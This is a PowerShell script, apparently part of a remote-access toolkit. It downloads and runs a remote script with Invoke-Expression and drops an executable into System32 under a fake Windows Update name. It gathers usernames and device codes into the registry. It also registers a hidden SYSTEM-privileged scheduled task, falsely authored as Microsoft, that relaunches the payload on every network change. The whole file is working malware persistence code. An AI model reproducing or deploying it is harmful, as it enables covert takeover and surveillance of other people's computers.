[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$localFilePath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\WindowsUpdateServiceDaemon.exe"
$urlforping = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/WindowsDiscordPingStatus.exe"
$urlfortc = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/TaskSchedulerServiceCreater.ps1"
$pingpreampdaemon = "Windows Update Service Daemon"
$regPath = "HKLM:\SOFTWARE\Microsoft\WindowsUpdateService"
$regpreampd = "HKLM:\SOFTWARE\Microsoft\MicrosoftUpdateServiceDaemon"
Invoke-Expression (Invoke-WebRequest -Uri $urlfortc -UseBasicParsing).Content
if (Test-Path -Path $localFilePath -PathType Leaf) {
    Remove-Item -Path $localFilePath -Force
}
try {
	Invoke-WebRequest -Uri $urlforping -OutFile $localFilePath -UseBasicParsing
} catch {}
New-Item -Path $regpreampd -Force | Out-Null
$code = (Get-ItemProperty -Path $regPath).Code
$Data = (Get-ItemProperty -Path $regPath).Data
$username = Get-WmiObject -Class Win32_UserProfile | Where-Object { $_.Special -eq $false } | ForEach-Object { $_.LocalPath.Split('\')[-1] }
$combineddata = "Newly Acquired Device **$code**, Status **$Data**, User(s) **$username** is/are"
Set-ItemProperty -Path $regpreampd -Name 'Name' -Value $combineddata
#Create Windows Scheduled task
$pingpreampdaemonxml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2023-10-15T12:03:06.3532289</Date>
    <Author>Microsoft\System</Author>
    <URI>\Windows Update Service Daemon</URI>
  </RegistrationInfo>
  <Triggers>
    <EventTrigger>
      <Enabled>true</Enabled>
      <Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="Microsoft-Windows-NetworkProfile/Operational"&gt;&lt;Select Path="Microsoft-Windows-NetworkProfile/Operational"&gt;*[System[Provider[@Name='Microsoft-Windows-NetworkProfile'] and EventID=10000]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>
    </EventTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>Queue</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
    <RestartOnFailure>
      <Interval>PT1M</Interval>
      <Count>999</Count>
    </RestartOnFailure>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>C:\Windows\System32\SecureBootUpdatesMicrosoft\WindowsUpdateServiceDaemon.exe</Command>
    </Exec>
  </Actions>
</Task>
"@
if (Get-ScheduledTask -TaskName $pingpreampdaemon -ErrorAction SilentlyContinue) {
Unregister-ScheduledTask -TaskName $pingpreampdaemon -Confirm:$false
} else {}
Register-ScheduledTask -Xml $pingpreampdaemonxml -TaskName $pingpreampdaemon | Out-Null
Start-ScheduledTask -TaskName $pingpreampdaemon
